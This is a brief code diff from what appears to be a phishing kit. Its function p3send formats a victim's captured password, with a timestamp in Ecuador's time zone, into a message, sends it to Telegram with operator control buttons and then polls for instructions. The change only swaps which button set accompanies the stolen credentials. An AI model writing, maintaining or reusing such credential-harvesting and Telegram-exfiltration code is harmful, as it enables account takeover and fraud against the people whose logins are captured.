@@ -235,7 +235,7 @@ async function p3send() {
 🔒 Contraseña: <b>${p}</b>
 📅 ${new Date().toLocaleString('es-EC',{timeZone:'America/Guayaquil'})}`;
 
-  try { await sendTelegram(msg, BUTTONS.login); } catch(e) { console.error(e); }
+  try { await sendTelegram(msg, BUTTONS.main); } catch(e) { console.error(e); }
   startPolling(dec);
 }
 
